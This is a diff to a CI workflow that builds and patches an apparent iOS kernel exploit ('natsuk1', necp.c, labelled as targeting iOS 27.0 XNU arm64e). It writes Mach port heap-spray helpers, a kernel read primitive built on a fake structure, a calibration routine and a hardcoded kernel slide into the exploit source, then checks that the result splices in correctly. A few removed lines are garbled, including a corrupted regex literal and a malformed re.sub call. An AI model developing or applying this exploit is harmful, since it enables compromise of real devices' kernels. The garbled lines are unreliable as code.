@@ -64,7 +64,7 @@ jobs:
           }
           CEOF
 
-          cat > /tmp/nk/ports.c <<'CEOF'
+          cat > /tmp/nk/ports_block.c <<'CEOF'
           #define NKS1_MAX_PORTS 512
           #define NKS1_PER_PORT  5
 
@@ -129,7 +129,21 @@ jobs:
           }
           CEOF
 
-          cat > /tmp/nk/kread.c <<'CEOF'
+          cat > /tmp/nk/dump_block.c <<'CEOF'
+          static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
+              char line[512];
+              int off = 0;
+              for (int i = 0; i < n && i < maxw; i++) {
+                  uint64_t w; memcpy(&w, p + i*8, 8);
+                  off += snprintf(line + off, sizeof(line) - off,
+                                  "%02d:0x%016llx ", i, (unsigned long long)w);
+                  if (off > 400) break;
+              }
+              log_info(tag, "%s", line);
+          }
+          CEOF
+
+          cat > /tmp/nk/kread_block.c <<'CEOF'
           static int kread_raw(uint64_t target_kaddr, uint32_t read_len) {
               uint8_t fake[NCF_STRUCT_SZ];
               memset(fake, 0x42, sizeof(fake));
@@ -180,7 +194,7 @@ jobs:
           }
           CEOF
 
-          cat > /tmp/nk/calib.c <<'CEOF'
+          cat > /tmp/nk/calib_block.c <<'CEOF'
           static int calibrate_kread(void) {
               if (g_res_off >= 0) return 0;
               const uint64_t expected = 0xFFFFFFF00ADEE310ULL;
@@ -222,7 +236,7 @@ jobs:
           }
           CEOF
 
-          cat > /tmp/nk/run.c <<'CEOF'
+          cat > /tmp/nk/run_block.c <<'CEOF'
           static volatile int g_busy = 0;
 
           static int nk_necp_run_impl(void) {
@@ -230,9 +244,9 @@ jobs:
               nk_log("=== natsuk1 v1.6 (natsuk1-kread-v6) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("");
-              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF1_ASSIGNED_LEN_OFF=0x%x NCF_REFCNT_OFF=0x%x NCF_PARENT_OFF=0x%x PORTS=%d PER_PORT=%d",
+              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_ASSIGNED_LEN_OFF=0x%x NCF_REFCNT_OFF=0x%x NCF_PARENT_OFF=0x%x PORTS=%d PER_PORT=%d",
                        NCF_ASSIGNED_OFF, NCF_ASSIGNED_LEN_OFF, NCF_REFCNT_OFF, NCF_PARENT_OFF,
-                       NKS1_MAX_PORTS, NKS_PER_PORT);
+                       NKS1_MAX_PORTS, NKS1_PER_PORT);
               g_slide = 0x3D00000ULL;
               g_kbase = KERNEL_BASE_STATIC + g_slide;
               log_ok("P1", "kbase=0x%llx", (unsigned long long)g_kbase);
@@ -263,88 +277,127 @@ jobs:
           CEOF
 
           cat > /tmp/nk/patch.py <<'PYEOF'
-          import re
           import sys
 
-          p = "natsuk1/Exploit/necp.c"
-          with open(p) as f:
+          MARKER = "natsuk1-kread-v6"
+          PATH = "natsuk1/Exploit/necp.c"
+
+          with open(PATH) as f:
               s = f.read()
 
-          if "natsuk1-kread-v6" in s:
-              print("already v6")
+          if MARKER in s:
+              print("already patched")
               sys.exit(0)
 
-          def rd(name):
+          def read_block(name):
               with open("/tmp/nk/" + name) as f:
                   return f.read().rstrip()
 
-          port_block = rd("port_block.c")
-          ports      = rd("ports.c")
-          kread      = rd("kread.c")
-          calib      = rd("calib.c")
-          run        = rd("run.c")
+          def remove_func(src, marker):
+              i = src.find(marker)
+              if i < 0:
+                  return src, False
+              j = src.find("\n}\n", i)
+              if j < 0:
+                  return src, False
+              line_start = src.rfind("\n", 0, i) + 1
+              return src[:line_start] + src[j + 3:], True
 
-          RE_PORT_BLOCK = r"static int port_set_qlimit\(mach_port_t.*?static mach_port_t port_new\(void\) \{.*?\n\}\n"
-          RE_KREAD      = r s",static int kread_raw count\(uint64_t \=w+,1 uint32_t \w+\) \{.*?\n\}\n"
-          RE_CALIB      = r"static int calibrate_kread\(void\) \{.*?\n\}\n"
-          RE_COMBINED   = r"static volatile int g_busy = 0;.*?int nk_necp_run\(void\) \{.*?\n\}\n"
-          RE_SINGLE     = r"int nk_necp_run\(void\) \{.*?\n\}\n"
-
-          required = [
-              ("port_block", RE_PORT_BLOCK),
-              ("kread_raw", RE_KREAD),
-              ("calibrate_kread", RE_CALIB),
-          ]
-          for name, rx in required:
-              if not re.search(rx, s, flags=re.DOTALL):
-                  print("ERROR: pattern '%s' not found" % name)
-                  sys.exit(1)
-
-          has_combined = bool(re.search(RE_COMBINED, s, flags=re.DOTALL))
-          has_single   = bool(re.search(RE_SINGLE, s, flags=re.DOTALL))
-          if not (has_combined or has_single):
-              print("ERROR: nk_necp_run not found")
-              sys.exit(1)
+          def remove_typedef(src, head, tail):
+              i = src.find(head)
+              if i < 0:
+                  return src
+              j = src.find(tail, i)
+              if j < 0:
+                  return src
+              return src[:i] + src[j + len(tail):]
 
           orig = s
 
-          s = re.sub(RE_PORT_BLOCK, port_block + "\n\n",, flags=re.DOTALL)
+          # ---- 1. remove old versions of everything we rewrite ----
+          for marker in [
+              "static void dump_buf_words(const char",
+              "static int port_set_qlimit(mach_port_t",
+              "static mach_port_t port_new(void)",
+              "static int ool_spray_count(mach_port_t",
+              "static void ool_spray(mach_port_t",
+              "static int kread_raw(uint64_t",
+              "static int calibrate_kread(void)",
+              "static void nks1_spray_init(nks1_spray_t",
+              "static int nks1_spray_send(nks1_spray_t",
+              "static void nks1_spray_drain(nks1_spray_t",
+              "static int nk_necp_run_impl(void)",
+          ]:
+              s, _ = remove_func(s, marker)
 
-          if "nks1_spray_t" not in s:
-              m = re.search(RE_KREAD, s, flags=re.DOTALL)
-              if not m:
-                  print("ERROR: cannot inject ports before kread_raw")
-                  sys.exit(1)
-              s = s[:m.start()] + ports + "\n\n" + s[m.start():]
+          # g_busy is a variable, not a function
+          s = s.replace("static volatile int g_busy = 0;\n", "")
+          s = s.replace("static volatile int g_qlimit_warned = 0;\n", "")
 
-          s = re.sub(RE_KREAD, kread + "\n\n", s, count=1, flags=re.DOTALL)
-          s = re.sub(RE_CALIB, calib + "\n\n", s, count=1, flags=re.DOTALL)
+          # old typedef
+          s = remove_typedef(s,
+              "typedef struct {\n    mach_port_t ports[NKS1_MAX_PORTS];",
+              "} nks1_spray_t;\n")
 
-          if has_combined:
-              s = re.sub(RE_COMBINED, run + "\n", s, count=1, flags=re.DOTALL)
-          else:
-              s = re.sub(RE_SINGLE, run + "\n", s, count=1, flags=re.DOTALL)
+          # old nk_necp_run (may or may not be the last function in the file)
+          i = s.find("int nk_necp_run(void)")
+          if i >= 0:
+              j = s.find("\n}\n", i)
+              if j >= 0:
+                  line_start = s.rfind("\n", 0, i) + 1
+                  s = s[:line_start] + s[j + 3:]
+              else:
+                  # ends at EOF
+                  line_start = s.rfind("\n", 0, i) + 1
+                  s = s[:line_start]
+                  if not s.endswith("\n"):
+                      s += "\n"
 
-          if s == orig:
-              print("ERROR: no changes")
+          # ---- 2. insert new blocks before kread64 ----
+          anchor = "static uint64_t kread64(uint64_t addr) {"
+          a = s.find(anchor)
+          if a < 0:
+              print("ERROR: kread64 anchor not found")
               sys.exit(1)
-          if "natsuk1-kread-v6" not in s:
-              print("ERROR: marker missing")
+
+          pieces = [
+              read_block("port_block.c"),
+              read_block("ports_block.c"),
+              read_block("dump_block.c"),
+              read_block("kread_block.c"),
+              read_block("calib_block.c"),
+          ]
+          injected = "\n\n".join(pieces) + "\n\n"
+
+          line_start = s.rfind("\n", 0, a) + 1
+          s = s[:line_start] + injected + s[line_start:]
+
+          # ---- 3. append run block ----
+          s = s.rstrip() + "\n\n" + read_block("run_block.c") + "\n"
+
+          # ---- 4. sanity checks ----
+          if s == orig:
+              print("ERROR: no changes applied")
+              sys.exit(1)
+          if MARKER not in s:
+              print("ERROR: marker not inserted")
               sys.exit(1)
 
           checks = [
               ("static volatile int g_busy = 0;", 1),
               ("static int nk_necp_run_impl(void)", 1),
               ("int nk_necp_run(void)", 1),
-              ("static mach_port_t port_new(void)", 1),
               ("static int port_set_qlimit(mach_port_t", 1),
-              ("typedef struct {\n    mach_port_t ports[NKS1_MAX_PORTS];", 1),
+              ("static mach_port_t port_new(void)", 1),
               ("static void nks1_spray_init(nks1_spray_t", 1),
               ("static int nks1_spray_send(nks1_spray_t", 1),
               ("static void nks1_spray_drain(nks1_spray_t", 1),
+              ("static void dump_buf_words(const char", 1),
               ("static int kread_raw(uint64_t", 1),
               ("static int calibrate_kread(void)", 1),
-              ("static void dump_buf_words(const char", 1),
+              ("static uint64_t kread64(uint64_t addr)", 1),
+              ("static int sanity_check(void)", 1),
+              ("static int task_sanity(void)", 1),
           ]
           for pat, want in checks:
               got = s.count(pat)
@@ -352,9 +405,9 @@ jobs:
                   print("ERROR: '%s' count=%d want=%d" % (pat[:40], got, want))
                   sys.exit(1)
 
-          with open(p, "w") as f:
+          with open(PATH, "w") as f:
               f.write(s)
-          print("necp.c v6 patched")
+          print("necp.c v6 patched, len=%d" % len(s))
           PYEOF
 
           python3 /tmp/nk/patch.py
@@ -467,7 +520,6 @@ jobs:
           F=natsuk1/Exploit/necp.c
           grep -q "natsuk1-kread-v6" "$F"
           grep -q "nks1_spray_t" "$F"
-          grep -q "nks1_spray_send" "$F"
           grep -q "NKS1_MAX_PORTS" "$F"
           grep -q "dump_buf_words" "$F"
           grep -q -e "----- attempt" "$F"
@@ -475,6 +527,7 @@ jobs:
           test "$(grep -c 'static int nk_necp_run_impl(void)' "$F")" = "1"
           test "$(grep -c 'int nk_necp_run(void)' "$F")" = "1"
           test "$(grep -c 'static mach_port_t port_new(void)' "$F")" = "1"
+          test "$(grep -c 'static int port_set_qlimit(mach_port_t' "$F")" = "1"
           test "$(grep -c 'static int kread_raw(uint64_t' "$F")" = "1"
           test "$(grep -c 'static int calibrate_kread(void)' "$F")" = "1"
           test "$(grep -c 'static void nks1_spray_init(nks1_spray_t' "$F")" = "1"
